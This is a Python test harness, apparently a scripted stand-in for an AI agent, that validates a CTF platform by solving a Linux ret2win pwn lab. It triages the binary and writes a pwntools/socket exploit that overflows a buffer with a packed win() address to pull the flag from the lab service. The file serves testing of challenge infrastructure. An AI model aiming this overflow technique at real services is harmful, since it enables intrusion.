"""Fake model policy for the Linux ret2win Pwn lab (link validation only).

Downloads the player-visible binary/source through the platform, triages the
binary with the toolbox helpers, writes a pwntools/socket exploit script into the
work directory, runs it against the TCP service, and submits the flag printed by
win(). The policy is scripted, not a real model; it only proves the solver's
download/shell/platform loop works end-to-end on a Linux host.
"""
from __future__ import annotations

import posixpath

try:
    from .fake_provider import (
        brief_question_id, brief_services, first_service, flag_in,
        parse_briefing, parse_observations, serve,
    )
except ImportError:
    from fake_provider import (
        brief_question_id, brief_services, first_service, flag_in,
        parse_briefing, parse_observations, serve,
    )

OFFSETS = (72, 80, 88)


def _tcp_service(brief: dict) -> dict | None:
    for service in brief_services(brief):
        if str(service.get("service_type") or "").lower() in {"tcp", "pwn", "raw"}:
            return service
    return first_service(brief)


def _attachment_names(brief: dict) -> list[str]:
    names = []
    for item in brief.get("attachments") or []:
        if isinstance(item, dict) and item.get("name"):
            names.append(str(item["name"]))
        elif isinstance(item, str):
            names.append(item)
    return names


def _downloaded(observations: list[dict]) -> set[str]:
    names = set()
    for item in observations:
        saved = str(item.get("saved_to") or "")
        if saved:
            names.add(posixpath.basename(saved.replace("\\", "/")))
    return names


def _shell_observations(observations: list[dict]) -> list[dict]:
    return [item for item in observations if "exit_code" in item]


def _flag_observation(observations: list[dict]) -> str | None:
    for item in reversed(observations):
        flag = flag_in(item)
        if flag:
            return flag
    return None


def _triage_command(binary: str) -> str:
    return (
        f"cd attachments; chmod +x {binary}; "
        f"echo '== checksec =='; (ctf-checksec ./{binary} 2>&1 | head -30 || true); "
        f"echo '== win symbol =='; "
        f"(nm ./{binary} 2>/dev/null | grep -E ' win$' || "
        f"objdump -t ./{binary} 2>/dev/null | grep -E ' win$' || true); "
        f"echo '== disasm =='; (ctf-disasm ./{binary} win 2>&1 | head -30 || true); "
        f"echo '== debug =='; "
        f"(ctf-debug ./{binary} 'break win' 'run' 'info registers' </dev/null 2>&1 | head -20 || true)"
    )


def _exploit_command(binary: str, host: str, port: int, offset: int) -> str:
    script = """\
import re
import socket
import struct
import subprocess

HOST = %r
PORT = %d
OFFSET = %d
BIN = %r


def win_address():
    try:
        from pwn import ELF, context
        context.log_level = "error"
        return ELF(BIN, checksec=False).symbols["win"]
    except Exception:
        output = subprocess.check_output(["nm", BIN], text=True,
                                         stderr=subprocess.DEVNULL)
        match = re.search(r"^([0-9a-fA-F]+)\\s+win$", output, re.MULTILINE)
        return int(match.group(1), 16)


def run_remote(payload):
    try:
        from pwn import context, remote
        context.log_level = "error"
        io = remote(HOST, PORT, timeout=10)
        io.sendline(payload)
        data = io.recvrepeat(5)
        io.close()
        return data
    except Exception:
        sock = socket.create_connection((HOST, PORT), timeout=10)
        sock.sendall(payload + b"\\n")
        sock.settimeout(5)
        data = b""
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                data += chunk
        except socket.timeout:
            pass
        return data


payload = b"A" * OFFSET + struct.pack("<Q", win_address())
print(run_remote(payload).decode("utf-8", "replace"))
""" % (host, int(port), int(offset), "./" + binary)
    return (f"cd attachments; cat > exploit.py <<'PY'\n{script}PY\n"
            f"python3 exploit.py")


def decide(messages: list[dict]) -> dict:
    brief = parse_briefing(messages)
    question_id = brief_question_id(brief)
    observations = parse_observations(messages)
    service = _tcp_service(brief)
    if not service or not service.get("port"):
        return {"action": "finish", "reason": "fake_model_no_tcp_service_in_brief"}
    host = str(service.get("host") or "127.0.0.1")
    port = int(service["port"])

    flag = _flag_observation(observations)
    if flag:
        return {"action": "submit", "question_id": question_id, "answer": flag,
                "evidence": f"ret2win exploit against {host}:{port} printed the flag"}
    if any("verdict" in item for item in observations):
        return {"action": "finish", "reason": "submission already decided by the platform"}

    names = _attachment_names(brief)
    binary = next((name for name in names if not name.lower().endswith((".c", ".h", ".txt"))),
                  "vuln")
    source = next((name for name in names if name.lower().endswith(".c")), None)
    downloaded = _downloaded(observations)

    if binary not in downloaded:
        return {"action": "download", "name": binary,
                "why": "download the vulnerable binary attachment"}
    if source and source not in downloaded:
        return {"action": "download", "name": source,
                "why": "download the source attachment for triage"}
    if any(item.get("error") for item in observations):
        return {"action": "finish", "reason": "tool error during the pwn pipeline"}

    shell_observations = _shell_observations(observations)
    if not shell_observations:
        return {"action": "shell", "command": _triage_command(binary),
                "why": "triage: checksec, win symbol and disassembly"}
    exploit_runs = shell_observations[1:]
    if len(exploit_runs) < len(OFFSETS):
        offset = OFFSETS[len(exploit_runs)]
        return {"action": "shell",
                "command": _exploit_command(binary, host, port, offset),
                "why": f"run ret2win exploit with return offset {offset}"}
    return {"action": "finish", "reason": "no scripted pwn step left for this observation"}


if __name__ == "__main__":
    raise SystemExit(serve(decide, "Fake model for the Pwn lab", "fake-pwn-model"))
